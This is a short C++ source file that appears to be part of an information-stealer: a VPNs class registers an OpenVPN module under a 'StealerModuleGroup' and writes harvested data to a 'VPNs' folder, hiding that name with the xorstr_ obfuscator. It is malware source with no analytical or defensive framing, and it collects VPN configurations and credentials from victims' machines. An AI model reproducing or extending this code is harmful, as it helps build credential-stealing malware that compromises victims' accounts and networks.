//
// Created by .1qxz on 08.06.2024.
//

#include "VPNs.h"
#include "impl/OpenVPN.h"

VPNs::VPNs()
{
    this->modules.push_back(new OpenVPN());
}

void VPNs::execute(fs::path &root) {
    fs::path vpns_path = root / xorstr_("VPNs");
    StealerModuleGroup::execute(vpns_path);
}